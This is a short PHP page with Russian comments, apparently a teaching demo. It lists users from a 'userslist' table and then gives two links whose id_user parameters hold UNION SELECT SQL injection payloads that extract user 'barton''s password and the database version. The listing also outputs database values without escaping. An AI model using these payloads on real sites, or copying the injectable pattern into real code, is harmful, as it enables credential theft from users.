
<?php
  // Устанавливаем соединение с базой данных
  require_once("config.php");
  // Запрашиваем список всех пользователей
  $query = "SELECT * FROM userslist ORDER BY name";
  $usr = mysqli_query($dbcnx, $query);
  if(!$usr) exit("Ошибка - ".mysqli_error());
  while($user = mysqli_fetch_array($usr))
  {
      echo "<a href=user.php?id_user=$user[id_user]>$user[name]</a><br>";
  }
?>
<a href="user.php?id_user=-1 UNION SELECT NULL, pass, NULL, NULL, NULL FROM userslist LIMIT 1,1">Пароль пользователя barton</a><br>
<a href="user.php?id_user=0+union+select+id_user,name,pass,version()+as+email,pass+as+url+from+userslist+where+id_user=2">Пароль пользователя barton + версия сервера</a>
